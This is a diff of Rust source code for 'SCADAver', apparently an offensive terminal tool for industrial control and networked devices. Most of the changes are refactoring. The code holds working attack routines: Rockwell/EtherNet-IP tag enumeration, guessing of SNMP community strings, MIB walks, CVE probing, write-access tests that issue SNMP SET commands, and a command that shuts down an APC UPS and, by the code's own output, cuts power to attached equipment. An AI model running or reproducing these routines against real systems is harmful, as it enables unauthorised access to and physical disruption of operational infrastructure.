         lines.push(fmt_tag_row(
             t.instance_id,
             &t.name,
@@ -5480,20 +5451,14 @@ fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> bool {
 /// Called when the exploit menu opens for Rockwell/enip with an empty output panel.
 /// Shows saved DB tags immediately, then starts a background live-check for changes.
 fn maybe_auto_load_tags(app: &mut App) {
-    let vendor = match app.selected_vendor() {
-        Some(v) => v,
-        None => return,
-    };
+    let Some(vendor) = app.selected_vendor() else { return };
     if !matches!(vendor.to_lowercase().as_str(), "rockwell" | "enip") {
         return;
     }
     if !app.output_lines.is_empty() {
         return;
     }
-    let ip = match app.selected_device_ip() {
-        Some(i) => i,
-        None => return,
-    };
+    let Some(ip) = app.selected_device_ip() else { return };
 
     let has_tags = load_db_tags_to_output(&ip, &mut app.output_lines);
 
@@ -5503,19 +5468,19 @@ fn maybe_auto_load_tags(app: &mut App) {
         app.active_jobs += 1;
         let tx = app.scan_tx.clone();
         std::thread::spawn(move || {
-            background_tag_check(ip, tx);
+            background_tag_check(&ip, &tx);
         });
     }
 }
 
 /// Background worker: enumerates live tags, diffs vs DB, reports changes.
-fn background_tag_check(ip: String, tx: mpsc::Sender<ScanEvent>) {
+fn background_tag_check(ip: &str, tx: &mpsc::Sender<ScanEvent>) {
     use crate::vendors::rockwell::driver;
     let out = |msg: &str| {
         let _ = tx.send(ScanEvent::Output(msg.to_string()));
     };
-    match driver::enumerate_tags(&ip, 0) {
-        Ok(tags) => save_tags_and_diff(&ip, &tags, &out),
+    match driver::enumerate_tags(ip, 0) {
+        Ok(tags) => save_tags_and_diff(ip, &tags, &out),
         Err(e) => out(&format!("[-] Live tag check failed: {e}")),
     }
     let _ = tx.send(ScanEvent::Done(format!("tag refresh @ {ip}")));
@@ -5548,18 +5513,18 @@ fn fire_exploit(app: &mut App, input: &str) {
             app.mode = Mode::ExploitConfirm;
             app.input_buf.clear();
         } else {
-            execute_pending_exploit(app, pending);
+            execute_pending_exploit(app, &pending);
         }
     }
 }
 
 // ─── Entry point ─────────────────────────────────────────────────────────────
 
-fn execute_pending_exploit(app: &mut App, pending: PendingExploit) {
+fn execute_pending_exploit(app: &mut App, pending: &PendingExploit) {
     let is_monitor = app
         .exploit_defs
         .get(pending.idx)
-        .map_or(false, |e| e.is_monitor);
+        .is_some_and(|e| e.is_monitor);
 
     if app.active_jobs == 0 {
         app.output_lines.clear();
@@ -5585,7 +5550,7 @@ fn execute_pending_exploit(app: &mut App, pending: PendingExploit) {
             let out = move |msg: &str| {
                 let _ = tx2.send(ScanEvent::Output(msg.to_string()));
             };
-            exploit_rockwell_monitor(&ip2, port, &out, stop);
+            exploit_rockwell_monitor(&ip2, port, &out, &stop);
             let _ = tx.send(ScanEvent::Done(format!("{label2} @ {ip2}")));
         });
     } else {
@@ -5598,6 +5563,228 @@ fn execute_pending_exploit(app: &mut App, pending: PendingExploit) {
             &pending.label,
             app.scan_tx.clone(),
         );
+    }
+}
+
+pub fn run(db: &Database) -> Result<()> {
+    let mut app = App::new(db);
+    app.log("[*] SCADAver started. Press [?] for help, [S] to scan, [A] to add an IP.");
+
+    let mut terminal = ratatui::init();
+    let result = run_loop(&mut terminal, &mut app, db);
+    ratatui::restore();
+    result
+}
+
+fn run_loop<B: Backend>(terminal: &mut Terminal<B>, app: &mut App, db: &Database) -> Result<()> {
+    loop {
+        app.drain_scan_events(db);
+        terminal.draw(|f| draw(f, app))?;
+
+        if event::poll(Duration::from_millis(50))? {
+            if let Event::Key(key) = event::read()? {
+                if key.kind == KeyEventKind::Press && handle_key(app, db, key.code, key.modifiers) {
+                    break;
+                }
+            }
+        }
+    }
+    Ok(())
+}
+
+// ─── Helpers ─────────────────────────────────────────────────────────────────
+
+fn hex_fmt(b: &[u8]) -> String {
+    use std::fmt::Write;
+    b.iter().fold(String::new(), |mut s, x| {
+        let _ = write!(s, "{x:02x}");
+        s
+    })
+}
+
+// ─── SNMP exploits ────────────────────────────────────────────────────────────
+
+fn exploit_snmp_sys_info(ip: &str, port: u16, out: &impl Fn(&str)) {
+    use crate::vendors::snmp::{client, oids};
+    let p = if port == 0 { client::SNMP_PORT } else { port };
+    out(&format!("[*] SNMP system info from {ip}:{p}..."));
+    let Some(community) = client::discover_community(ip, p) else {
+        out("[-] No SNMP response on any common community");
+        return;
+    };
+    let scalar = [oids::SYS_DESCR, oids::SYS_OBJECT_ID, oids::SYS_UPTIME,
+                  oids::SYS_CONTACT, oids::SYS_NAME, oids::SYS_LOCATION];
+    let labels = ["sysDescr", "sysOID", "Uptime", "Contact", "Name", "Location"];
+    match client::get_multi(ip, p, &community, &scalar) {
+        Ok(results) => {
+            out(&format!("  community = {community}"));
+            for (i, (_, val)) in results.iter().enumerate() {
+                out(&format!("  {:<10} = {}", labels[i], val.display()));
+            }
+            out("[+] System info retrieved");
+        }
+        Err(e) => out(&format!("[-] {e}")),
+    }
+}
+
+fn exploit_snmp_interfaces(ip: &str, port: u16, out: &impl Fn(&str)) {
+    use crate::vendors::snmp::{client, enumerate};
+    let p = if port == 0 { client::SNMP_PORT } else { port };
+    out(&format!("[*] SNMP interface table from {ip}:{p}..."));
+    let Some(community) = client::discover_community(ip, p) else {
+        out("[-] No SNMP response");
+        return;
+    };
+    match enumerate::get_interfaces(ip, p, &community) {
+        Ok(ifaces) if ifaces.is_empty() => out("[!] No interface entries returned"),
+        Ok(ifaces) => {
+            for i in &ifaces {
+                let state = if i.oper_up { "up" } else { "DOWN" };
+                out(&format!("  [{:>2}] {:<16} {} {:<5}  {}Mbps  err in:{} out:{}",
+                    i.index, i.descr, i.mac, state, i.speed_mbps, i.in_errors, i.out_errors));
+            }
+            out(&format!("[+] {} interface(s)", ifaces.len()));
+        }
+        Err(e) => out(&format!("[-] {e}")),
+    }
+}
+
+fn exploit_snmp_topology(ip: &str, port: u16, out: &impl Fn(&str)) {
+    use crate::vendors::snmp::{client, enumerate};
+    let p = if port == 0 { client::SNMP_PORT } else { port };
+    out(&format!("[*] SNMP network topology from {ip}:{p}..."));
+    let Some(community) = client::discover_community(ip, p) else {
+        out("[-] No SNMP response");
+        return;
+    };
+    match enumerate::get_topology(ip, p, &community) {
+        Ok(lines) if lines.is_empty() => out("[!] No IP/route/ARP data returned"),
+        Ok(lines) => {
+            for l in &lines { out(l); }
+            out("[+] Topology data retrieved");
+        }
+        Err(e) => out(&format!("[-] {e}")),
+    }
+}
+
+fn exploit_snmp_community_scan(ip: &str, port: u16, out: &impl Fn(&str)) {
+    use crate::vendors::snmp::{client, oids};
+    let p = if port == 0 { client::SNMP_PORT } else { port };
+    out(&format!("[*] SNMP community scan on {ip}:{p}..."));
+    let mut found = 0u32;
+    for &c in oids::COMMON_COMMUNITIES {
+        if let Ok(val) = client::get(ip, p, c, oids::SYS_DESCR) {
+            out(&format!("  [+] community={c:<12}  sysDescr={}", val.display()));
+            found += 1;
+        }
+    }
+    if found == 0 {
+        out("[-] No community strings responded");
+    } else {
+        out(&format!("[+] {found} community string(s) found"));
+    }
+}
+
+fn exploit_snmp_cve_probe(ip: &str, port: u16, out: &impl Fn(&str)) {
+    use crate::vendors::snmp::{client, enumerate};
+    let p = if port == 0 { client::SNMP_PORT } else { port };
+    out(&format!("[*] SNMP CVE probe on {ip}:{p}..."));
+    let Some(community) = client::discover_community(ip, p) else {
+        out("[-] No SNMP response");
+        return;
+    };
+    match enumerate::get_system_info(ip, p, &community) {
+        Ok(info) => {
+            out(&format!("  sysDescr = {}", info.descr));
+            out(&format!("  sysOID   = {}", info.object_id));
+            let hits = enumerate::check_cves(&info);
+            if hits.is_empty() {
+                out("[*] No known CVE patterns matched");
+            } else {
+                for h in &hits {
+                    out(&format!("  [{}] CVSS:{} {}", h.id, h.cvss, h.summary));
+                    out(&format!("         ref: {}", h.ref_url));
+                }
+                out(&format!("[!] {} advisory match(es)", hits.len()));
+            }
+        }
+        Err(e) => out(&format!("[-] {e}")),
+    }
+}
+
+fn exploit_snmp_walk(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
+    use crate::vendors::snmp::client;
+    let p = if port == 0 { client::SNMP_PORT } else { port };
+    let root = if input.trim().is_empty() { "1.3.6.1.2.1.1" } else { input.trim() };
+    out(&format!("[*] SNMP walk {root} on {ip}:{p}..."));
+    let Some(community) = client::discover_community(ip, p) else {
+        out("[-] No SNMP response");
+        return;
+    };
+    match client::walk(ip, p, &community, root) {
+        Ok(entries) if entries.is_empty() => out("[!] No results (end of MIB or no access)"),
+        Ok(entries) => {
+            for (o, v) in &entries { out(&format!("  {o} = {}", v.display())); }
+            out(&format!("[+] {} object(s)", entries.len()));
+        }
+        Err(e) => out(&format!("[-] {e}")),
+    }
+}
+
+fn exploit_snmp_test_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
+    use crate::vendors::snmp::{client, oids};
+    let p = if port == 0 { client::SNMP_PORT } else { port };
+    let community = if input.trim().is_empty() { "private" } else { input.trim() };
+    out(&format!("[*] SNMP write test on {ip}:{p} with community='{community}'..."));
+    // Read current sysName, then SET it back to the same value (no-op write)
+    match client::get(ip, p, "public", oids::SYS_NAME) {
+        Ok(current) => {
+            let name_str = current.display();
+            out(&format!("  current sysName = {name_str}"));
+            let val = client::SnmpValue::OctetString(name_str.into_bytes());
+            match client::set(ip, p, community, oids::SYS_NAME, &val) {
+                Ok(_) => out("[+] Write confirmed — community string has write access"),
+                Err(e) => out(&format!("[-] Write rejected: {e}")),
+            }
+        }
+        Err(e) => out(&format!("[-] Could not read sysName: {e}")),
+    }
+}
+
+fn exploit_snmp_apc_status(ip: &str, port: u16, out: &impl Fn(&str)) {
+    use crate::vendors::snmp::{client, oids};
+    let p = if port == 0 { client::SNMP_PORT } else { port };
+    out(&format!("[*] APC UPS status from {ip}:{p}..."));
+    let Some(community) = client::discover_community(ip, p) else {
+        out("[-] No SNMP response");
+        return;
+    };
+    let apc_oids = [oids::APC_MODEL, oids::APC_FIRMWARE, oids::APC_SERIAL,
+                    oids::APC_BATTERY_STATUS, oids::APC_RUNTIME_MINS,
+                    oids::APC_INPUT_VOLTAGE, oids::APC_OUTPUT_LOAD_PCT, oids::APC_OUTPUT_STATUS];
+    let labels = ["Model", "Firmware", "Serial", "Battery", "Runtime(min)", "InputV", "Load%", "OutStatus"];
+    match client::get_multi(ip, p, &community, &apc_oids) {
+        Ok(results) => {
+            for (i, (_, val)) in results.iter().enumerate() {
+                out(&format!("  {:<14} = {}", labels[i], val.display()));
+            }
+            let bat = results.get(3).and_then(|(_, v)| v.as_int()).unwrap_or(0);
+            if bat != 2 { out("[!] Battery status is NOT normal (2=normal)"); }
+            out("[+] APC status retrieved");
+        }
+        Err(e) => out(&format!("[-] {e}")),
+    }
+}
+
+fn exploit_snmp_apc_shutdown(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
+    use crate::vendors::snmp::{client, oids};
+    let p = if port == 0 { client::SNMP_PORT } else { port };
+    let community = if input.trim().is_empty() { "private" } else { input.trim() };
+    out(&format!("[!] APC graceful shutdown on {ip}:{p} with community='{community}'"));
+    out("[!] This will cut power to attached equipment after the UPS delay.");
+    match client::set(ip, p, community, oids::APC_CMD_GRACEFUL_OFF, &client::SnmpValue::Integer(2)) {
+        Ok(_) => out("[+] Graceful shutdown command accepted — equipment will lose power"),
+        Err(e) => out(&format!("[-] Command rejected: {e}")),
     }
 }
 
@@ -6061,231 +6248,5 @@ mod tests {
         assert_eq!(phoenix.action_port("phoenix", 4), 1962);
         assert_eq!(phoenix.action_port("phoenix", 5), 0);
         assert_eq!(phoenix.action_port("phoenix", 6), 0);
-    }
-}
-
-pub fn run(db: Database) -> Result<()> {
-    let mut app = App::new(&db)?;
-    app.log("[*] SCADAver started. Press [?] for help, [S] to scan, [A] to add an IP.");
-
-    let mut terminal = ratatui::init();
-    let result = run_loop(&mut terminal, &mut app, &db);
-    ratatui::restore();
-    result
-}
-
-fn run_loop<B: Backend>(terminal: &mut Terminal<B>, app: &mut App, db: &Database) -> Result<()> {
-    loop {
-        app.drain_scan_events(db);
-        terminal.draw(|f| draw(f, app))?;
-
-        if event::poll(Duration::from_millis(50))? {
-            if let Event::Key(key) = event::read()? {
-                if key.kind == KeyEventKind::Press && handle_key(app, db, key.code, key.modifiers) {
-                    break;
-                }
-            }
-        }
-    }
-    Ok(())
-}
-
-// ─── Helpers ─────────────────────────────────────────────────────────────────
-
-fn hex_fmt(b: &[u8]) -> String {
-    b.iter().map(|x| format!("{x:02x}")).collect()
-}
-
-// ─── SNMP exploits ────────────────────────────────────────────────────────────
-
-fn snmp_community(dev_fields: Option<&std::collections::HashMap<String, serde_json::Value>>) -> String {
-    dev_fields
-        .and_then(|f| f.get("snmp_community"))
-        .and_then(|v| v.as_str())
-        .unwrap_or("public")
-        .to_string()
-}
-
-fn exploit_snmp_sys_info(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP system info from {ip}:{p}..."));
-    let community = match client::discover_community(ip, p) {
-        Some(c) => c,
-        None => { out("[-] No SNMP response on any common community"); return; }
-    };
-    let scalar = [oids::SYS_DESCR, oids::SYS_OBJECT_ID, oids::SYS_UPTIME,
-                  oids::SYS_CONTACT, oids::SYS_NAME, oids::SYS_LOCATION];
-    let labels = ["sysDescr", "sysOID", "Uptime", "Contact", "Name", "Location"];
-    match client::get_multi(ip, p, &community, &scalar) {
-        Ok(results) => {
-            out(&format!("  community = {community}"));
-            for (i, (_, val)) in results.iter().enumerate() {
-                out(&format!("  {:<10} = {}", labels[i], val.display()));
-            }
-            out("[+] System info retrieved");
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_interfaces(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, enumerate};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP interface table from {ip}:{p}..."));
-    let community = match client::discover_community(ip, p) {
-        Some(c) => c,
-        None => { out("[-] No SNMP response"); return; }
-    };
-    match enumerate::get_interfaces(ip, p, &community) {
-        Ok(ifaces) if ifaces.is_empty() => out("[!] No interface entries returned"),
-        Ok(ifaces) => {
-            for i in &ifaces {
-                let state = if i.oper_up { "up" } else { "DOWN" };
-                out(&format!("  [{:>2}] {:<16} {} {:<5}  {}Mbps  err in:{} out:{}",
-                    i.index, i.descr, i.mac, state, i.speed_mbps, i.in_errors, i.out_errors));
-            }
-            out(&format!("[+] {} interface(s)", ifaces.len()));
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_topology(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, enumerate};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP network topology from {ip}:{p}..."));
-    let community = match client::discover_community(ip, p) {
-        Some(c) => c,
-        None => { out("[-] No SNMP response"); return; }
-    };
-    match enumerate::get_topology(ip, p, &community) {
-        Ok(lines) if lines.is_empty() => out("[!] No IP/route/ARP data returned"),
-        Ok(lines) => {
-            for l in &lines { out(l); }
-            out("[+] Topology data retrieved");
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_community_scan(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP community scan on {ip}:{p}..."));
-    let mut found = 0u32;
-    for &c in oids::COMMON_COMMUNITIES {
-        if let Ok(val) = client::get(ip, p, c, oids::SYS_DESCR) {
-            out(&format!("  [+] community={c:<12}  sysDescr={}", val.display()));
-            found += 1;
-        }
-    }
-    if found == 0 {
-        out("[-] No community strings responded");
-    } else {
-        out(&format!("[+] {found} community string(s) found"));
-    }
-}
-
-fn exploit_snmp_cve_probe(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, enumerate};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP CVE probe on {ip}:{p}..."));
-    let community = match client::discover_community(ip, p) {
-        Some(c) => c,
-        None => { out("[-] No SNMP response"); return; }
-    };
-    match enumerate::get_system_info(ip, p, &community) {
-        Ok(info) => {
-            out(&format!("  sysDescr = {}", info.descr));
-            out(&format!("  sysOID   = {}", info.object_id));
-            let hits = enumerate::check_cves(&info);
-            if hits.is_empty() {
-                out("[*] No known CVE patterns matched");
-            } else {
-                for h in &hits {
-                    out(&format!("  [{}] CVSS:{} {}", h.id, h.cvss, h.summary));
-                    out(&format!("         ref: {}", h.ref_url));
-                }
-                out(&format!("[!] {} advisory match(es)", hits.len()));
-            }
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_walk(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::client;
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    let root = if input.trim().is_empty() { "1.3.6.1.2.1.1" } else { input.trim() };
-    out(&format!("[*] SNMP walk {root} on {ip}:{p}..."));
-    let community = match client::discover_community(ip, p) {
-        Some(c) => c,
-        None => { out("[-] No SNMP response"); return; }
-    };
-    match client::walk(ip, p, &community, root) {
-        Ok(entries) if entries.is_empty() => out("[!] No results (end of MIB or no access)"),
-        Ok(entries) => {
-            for (o, v) in &entries { out(&format!("  {o} = {}", v.display())); }
-            out(&format!("[+] {} object(s)", entries.len()));
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_test_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    let community = if input.trim().is_empty() { "private" } else { input.trim() };
-    out(&format!("[*] SNMP write test on {ip}:{p} with community='{community}'..."));
-    // Read current sysName, then SET it back to the same value (no-op write)
-    match client::get(ip, p, "public", oids::SYS_NAME) {
-        Ok(current) => {
-            let name_str = current.display();
-            out(&format!("  current sysName = {name_str}"));
-            let val = client::SnmpValue::OctetString(name_str.into_bytes());
-            match client::set(ip, p, community, oids::SYS_NAME, val) {
-                Ok(_) => out("[+] Write confirmed — community string has write access"),
-                Err(e) => out(&format!("[-] Write rejected: {e}")),
-            }
-        }
-        Err(e) => out(&format!("[-] Could not read sysName: {e}")),
-    }
-}
-
-fn exploit_snmp_apc_status(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] APC UPS status from {ip}:{p}..."));
-    let community = match client::discover_community(ip, p) {
-        Some(c) => c,
-        None => { out("[-] No SNMP response"); return; }
-    };
-    let apc_oids = [oids::APC_MODEL, oids::APC_FIRMWARE, oids::APC_SERIAL,
-                    oids::APC_BATTERY_STATUS, oids::APC_RUNTIME_MINS,
-                    oids::APC_INPUT_VOLTAGE, oids::APC_OUTPUT_LOAD_PCT, oids::APC_OUTPUT_STATUS];
-    let labels = ["Model", "Firmware", "Serial", "Battery", "Runtime(min)", "InputV", "Load%", "OutStatus"];
-    match client::get_multi(ip, p, &community, &apc_oids) {
-        Ok(results) => {
-            for (i, (_, val)) in results.iter().enumerate() {
-                out(&format!("  {:<14} = {}", labels[i], val.display()));
-            }
-            let bat = results.get(3).and_then(|(_, v)| v.as_int()).unwrap_or(0);
-            if bat != 2 { out("[!] Battery status is NOT normal (2=normal)"); }
-            out("[+] APC status retrieved");
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_apc_shutdown(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use crate::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    let community = if input.trim().is_empty() { "private" } else { input.trim() };
-    out(&format!("[!] APC graceful shutdown on {ip}:{p} with community='{community}'"));
-    out("[!] This will cut power to attached equipment after the UPS delay.");
-    match client::set(ip, p, community, oids::APC_CMD_GRACEFUL_OFF, client::SnmpValue::Integer(2)) {
-        Ok(_) => out("[+] Graceful shutdown command accepted — equipment will lose power"),
-        Err(e) => out(&format!("[-] Command rejected: {e}")),
     }
 }
